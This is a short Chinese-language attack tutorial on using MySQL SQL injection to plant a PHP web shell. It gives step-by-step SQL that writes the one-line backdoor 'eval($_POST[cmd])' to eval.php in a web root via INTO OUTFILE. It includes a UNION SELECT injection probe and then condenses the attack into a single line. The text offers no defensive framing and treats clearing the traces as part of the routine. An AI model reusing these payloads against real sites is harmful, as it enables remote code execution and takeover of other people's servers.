## 基本流程

1. `Drop TABLE IF EXISTS temp;`             //如果存在temp就删掉

2. `Create TABLE temp(cmd text NOT NULL);`           //建立temp表，里面就一个cmd字段

3. `Insert INTO temp (cmd) VALUES('<? php eval($_POST[cmd]);?>');`               //把一句话木马插入到temp表

4. `Select cmd from temp into out file 'F:/wwwroot/eval.php';`               //查询temp表中的一句话并把结果导入到eval.php

5. `Drop TABLE IF EXISTS temp;`                      //删除temp(擦屁股o(∩_∩)o...)


-------
不过想想我们在测试PHP的SQL漏洞的时候经常用如下的语句：

/**/UNION SELECT 1,2,3,4,5,6,7,8,9,10,11,12/*

然后返回的页面中可能会出现1~12之间的数字。这里加入数字3显示出来了。
如果我们把上面这句改成/**/UNION SELECT 1,2,'zerosoul',4,5,6,7,8,9,10,11,12/*，则返回页面上次显示3的地方会显示zerosoul。
也就是说如果我们的select语句后面不带from table语句的话，我们说查询的数字或字符会直接返回到查询结果里。
既然这样，我们为何还要那么麻烦去建一个表，先导入数据，再导出这样折腾呢。

有了这个思路，上面那一大段到出一句话的SQL代码可以直接简化到一句:

Select '<? php eval($_POST[cmd]);?>' into outfile 'F:/wwwroot/eval.php';
